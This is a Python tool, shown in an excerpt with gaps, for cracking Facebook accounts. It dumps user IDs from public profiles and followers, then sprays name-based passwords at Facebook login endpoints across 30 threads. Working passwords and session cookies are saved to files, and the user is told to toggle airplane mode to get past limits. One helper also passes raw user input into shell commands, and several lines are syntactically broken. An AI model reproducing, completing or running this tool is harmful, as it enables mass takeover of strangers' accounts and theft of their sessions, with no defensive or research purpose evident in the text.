...
from concurrent.futures import ThreadPoolExecutor as SHIVAMXWD
from string import * 
...
sys.stdout.write('\x1b]2; SHIVAM\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[92;1m➤➤⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃ SHIVAM X BEPEYYY ⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤➤
\033[33m【✪】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤
\033[1;32m【✪】ᴀᴜᴛʜᴏʀ  ✯  sʜɪᴠᴀᴍ xᴡᴅ
\033[1;32m【✪】FB Gʀᴏᴜᴘ     ✯  COMING SOON 
\033[1;32m【✪】Oɴ Gɪᴛʜᴜʙ    ✯  sʜɪᴠᴀᴍ xᴡᴅ𝟽
\033[1;32m【✪】Tᴏᴏʟ SᴛᴀᴛᴜS  ✯  \033[1;32mFREE
\033[1;32m【✪】Tᴏᴏʟ Vᴇʀsɪᴏɴ ✯  1.2
\033[33m【✪】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃□⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤"""
def clear():
    os.system("clear")
    print(logo)    
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SHIVAMMenu ")
        exit()

def BRAND():   
    os.system('clear')
    print(logo)
    print(f'\033[1;32m[1]\033[1;32mFile Crack ( 100% working)')
    ...
    print(f'\033[1;32m[9]\033[1;91mRemove Duplicate IDs')
    print(f'\033[1;32m[G]\033[1;32mContact Admin ')
    print(f'\033[1;32m[F]\033[1;32mAaauxa new cmd')
    print('')
    select = input('Select Menu>: ')
    if select =='1':
        method_crack()
    elif select =='2':
        exit(' THIS OPTION WILL BE AVAILABLE VERY SOON...')
    elif select =='3':
        random_number()
    elif select =='4':
       menu()
       ...
       cutter()
        ...
        os.system('xdg-open https://t.me/Shivamxwd/')
        pass
    elif select =='F':
        os.system('xdg-openhttps://www.facebook.com/shivamxwd88 /')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SHIVAM(allkey)
...
def method_crack():
    global methods
    clear()
    print(f'\033[1;32m[1]\033[1;32mMethod {1}')(BEST)
    print(f'\033[1;32m[2]\33[1;96mMethod {2}')
    print(f'\033[1;32m[3]\033[1;32mMethod {3}')
    #print(f'[4] Method {4}')
    print(f'\033[1;91m[0]\033[1;91mBack')
    print('')
    option = input('\033[1;32mSelect method>: ')
    if option =='1':
...
class main_crack():
    ...
    def crack(self,id):
        global methods
        clear()
        self.file = input('\033[1;32mFile name hala : ')
        try:
            self.id = open(self.file).read().splitlines()
            self.pasw()
        except FileNotFoundError:
            print('\033[1;91mOpps File Not Found ...')
            time.sleep(2)
            os.system('clear')
            print(logo)
            print('\033[33mTry Again ...')
            time.sleep(2)
            main_crack().crack(id)
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {G}[SHIVAM] {loop} | {Y}M1 {G}OK/{r}CP {len(oks)}/{len(cps)} | {G}{'{:.0%}'.format(loop/float(len(self.id)))}{G}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SHIVAMb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SHIVAMb};{ckkk}"
                    print(f"\r{R} [SHIVAM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SHIVAM_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SHIVAM_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SHIVAM-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/SHIVAM_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {G}[SHIVAM] {loop} | {Y}M3 {G}OK/{r}CP {len(oks)}/{len(cps)} | {G}{'{:.0%}'.format(loop/float(len(self.id)))}{G}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SHIVAM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SHIVAM_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SHIVAM_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SHIVAM-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {G}[SHIVAM] {loop} | {Y}M2 {G}OK/{r}CP {len(oks)}/{len(cps)} | {G}{'{:.0%}'.format(loop/float(len(self.id)))}{G}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {G}[SHIVAM] {loop} | {Y}M4 {G}OK/{r}CP {len(oks)}/{len(cps)} | {G}{'{:.0%}'.format(loop/float(len(self.id)))}{G}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [SHIVAM-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SHIVAM_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            pw = []
            clear()
            print('\33[1;96mPut limit between 1 to 30')
            sl = int(input('\033[1;32mHow many password do you want to add?: '))
            os.system("clear")
            print(logo)
            print(f'{S} [\33[1;96mExample: first123,last1122,firstlast,last,ETC]')
            print('')
            if sl =='':
                print('\n \33[1;96mPut limit between 1 to 30')
            elif sl > 20:
                print('\n\033[1;91mPassword limit Should Not Be Greater Than 30')
            else:
                for sr in range(sl):
                    pw.append(input(f'\033[1;32mPassword {sr+1}: '))
            os.system("clear")
            print(logo)
            
            print(f"\r{G}Use flight【AIRPLANE】mode before use {G}")
            print(47*"-")
            print(f'\033[1;32mTotal IDs : %s ' % len(self.id))
            print(f'\033[1;32mCracking Started...')
            print(47*"-")
            with BRANDSHIVAM(max_workers=30) as SHIVAMworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SHIVAMworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SHIVAMworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SHIVAMworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SHIVAMworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SHIVAM.txt') 
        print(47*"-")
        ...
        print('')
        print(47*"-")
        print (f"\033[1;32mTotal IDs: {(str(len(open(filepath,'r').readlines())))}")
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/SHIVAM.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    SHIVAM = input('Put File Name :')
    print(" ")
    BRAND = input('Saving Put File Name :')
    os.system('touch ' +BRAND)
    os.system('sort -r '+SHIVAM+' | uniq > '+BRAND)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SHIVAM )
    print(47*'-')
    print("File Saved To :" + BRAND )
    print(47*'-')
    input(f"{S} Press Enter To Back SHIVAM Menu ")
    menu
...
def menu():
    ...
    print(47*"-")
    print(f'\033[1;32m[1]\033[1;32mDUMP FROM PUBLIC ID [Simple]')
    print(f'\033[1;32m[2]\33[1;96mDUMP FROM PUBLIC ID [UNLIMITED-auto-separate]')
    print(f'\033[1;32m[3]\033[33mDUMP FROM PUBLIC ID [UNLIMITED]')
    print('\033[1;32m[4]\033[93mDUMP FROM FOLLOWERS [UNLIMITED]')
    print('\033[1;32m[5]\033[1;91mRemove Duplicate Links ')
    print('\033[1;32m[6]\033[1;32mSeprate Links ')
    print('\033[1;32m[0]\033[1;91mRemove Cookie ')
    print(47*"-")
    select = input('Select Menu: ')
    if select =='1':
        p_dump()
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/SHIVAM.txt\n') 
        filepath = input("Put File Name: ")
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
            print(f'\033[1;32mTotal IDs : {totaldmp}')
        apnd.close()
        print(47*'-')
        print(f"\033[1;32mTotal IDs: {totaldmp} ")
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back SHIVAM Menu ")
        SHIVAM(allkey)
    except Exception as e:
        print("Error : %s"%e) 
